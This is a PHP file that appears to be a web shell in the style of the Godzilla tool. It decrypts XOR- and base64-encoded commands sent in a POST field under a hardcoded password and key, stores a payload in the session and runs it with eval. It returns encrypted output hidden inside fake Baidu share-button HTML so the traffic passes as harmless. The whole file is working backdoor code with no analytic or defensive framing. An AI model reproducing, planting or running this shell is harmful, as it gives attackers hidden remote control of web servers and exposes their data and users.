<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);

function encode($D, $K){
    for ($i = 0; $i < strlen($D); $i++) {
        $c = $K[$i + 1 & 15];
        $D[$i] = $D[$i] ^ $c;
    }
    return $D;
}

$pass = 'ssdt';
$payloadName = 'payload';
$key = '5c02b0b6cc567928';

if (isset($_POST[$pass])) {
    $data = encode(base64_decode($_POST[$pass]), $key);

    if (isset($_SESSION[$payloadName])) {
        $payload = encode($_SESSION[$payloadName], $key);

        if (strpos($payload, "getBasicsInfo") === false) {
            $payload = encode($payload, $key);
        }

        eval($payload);
        $left = substr(md5($pass . $key), 0, 5);
        $replacedString = str_replace("bdsek", $left, "var Rebdsek_config=");
        header('Content-Type: text/html');
        echo '<!DOCTYPE html>';
        echo '<html lang="en">';
        echo '<head>';
        echo '<meta charset="UTF-8">';
        echo '<title>GetConfigKey</title>';
        echo '</head>';
        echo '<body>';
        echo '<script>';
        echo '<!-- Baidu Button BEGIN';
        echo '<script type="text/javascript" id="bdshare_js" data="type=slide&amp;img=8&amp;pos=right&amp;uid=6537022" ></script>';
        echo '<script type="text/javascript" id="bdshell_js"></script>';
        echo '<script type="text/javascript">';
        echo $replacedString;
        echo base64_encode(encode(@run($data),$key));
        echo ";";
        echo 'document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000);';
        echo '</script>';
        echo '-->';
        echo '</script>';
        echo '</body>';
        echo '</html>';
    } else {
        if (strpos($data, "getBasicsInfo") !== false) {
            $_SESSION[$payloadName] = encode($data, $key);
        }
    }
}
?>
